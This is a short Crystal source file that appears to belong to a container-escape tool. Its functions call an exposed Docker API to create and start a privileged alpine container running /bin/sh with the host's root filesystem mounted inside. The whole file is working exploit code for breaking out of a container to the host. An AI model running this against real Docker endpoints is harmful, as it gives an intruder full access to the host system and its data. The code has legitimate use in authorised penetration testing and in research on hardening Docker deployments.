require "http"
require "json"

def network_socket_breakout(ip)
    puts("Network socket breakout")
    id = create_breakout_container(ip)
    puts("Created container: #{id}")
    start_breakout_container(ip,id)
    puts("Started container: #{id}")
    exit()
end


def create_breakout_container(ip)
    url = "#{ip}containers/create"
    begin 
        host_config = {
            "Binds": ["/:/hostOS"],
        }
        post_data = {"Image": "alpine", "Cmd": "/bin/sh", "privileged": true, "AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"HostConfig": host_config}
        post_data = post_data.to_json
        resp = HTTP::Client.post(url,  headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: post_data)
        if resp != nil && resp.status_code == 201 && !resp.body.empty?
            return JSON.parse(resp.body)["Id"]
        else
            raise("Non 200 response from docker socket\n#{resp.body}")
        end
    rescue e
      puts("Error occured attempting escape on #{ip}\n#{e}")
    end
end


def start_breakout_container(ip,id)
    url = "#{ip}containers/#{id}/start"
    begin 
        resp = HTTP::Client.post(url, headers: HTTP::Headers{"Content-Type"=> "application/json"})
        if resp != nil && resp.status_code == 204
            puts(resp.body)
        else
            raise("Non 200 response from docker socket\n#{resp.body}")
        end
    rescue e
      puts("Error occured attempting escape on #{ip}\n#{e}")
    end
end